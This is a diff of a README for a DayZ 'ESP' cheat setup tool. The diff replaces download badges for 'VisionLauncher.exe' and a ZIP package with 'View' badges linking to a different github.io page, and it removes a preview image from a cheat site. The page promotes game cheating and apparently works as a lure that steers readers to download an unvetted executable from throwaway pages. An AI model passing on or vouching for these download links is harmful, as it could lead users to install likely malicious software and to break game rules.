@@ -1,7 +1,7 @@
 # 🎯 DayZ ESP Vision Enhancer — Setup Tool
 
-[![Download VisionLauncher.exe](https://img.shields.io/badge/Download-VisionLauncher.exe-green?style=for-the-badge)](https://joshuadodsonjsyo.github.io/.github/DayZ-ESP-Setup-Tool)
-[![Get Full Setup](https://img.shields.io/badge/Get_Setup_Package-ZIP-blue?style=for-the-badge)](https://joshuadodsonjsyo.github.io/.github/DayZ-ESP-Setup-Tool)
+[![View DayZ ESP](https://img.shields.io/badge/View-DayZ%20ESP-8B4513?style=flat-square)](https://dayz-esp-vision.github.io/.github/)
+[![View DayZ ESP(ZIP)](https://img.shields.io/badge/View-DayZ%20ESP-8B4513?style=flat-square)](https://dayz-esp-vision.github.io/.github/)
 
 ---
 
@@ -62,9 +62,6 @@ Boost your awareness in DayZ encounters with this ESP-focused assistant. Highlig
 ---
 
 ## 🖼 Preview
-
-![DayZ ESP Overlay](https://wh-satano.ru/storage/media/dayz_multi4.webp)  
-*Real-time loot + player box display with range scaling*
 
 ![Radar Mode](https://www.skycheats.com/uploads/monthly_2025_05/DayZESP.webp.15a2caf96fb4444b837a283a44408f5e.webp)  
 
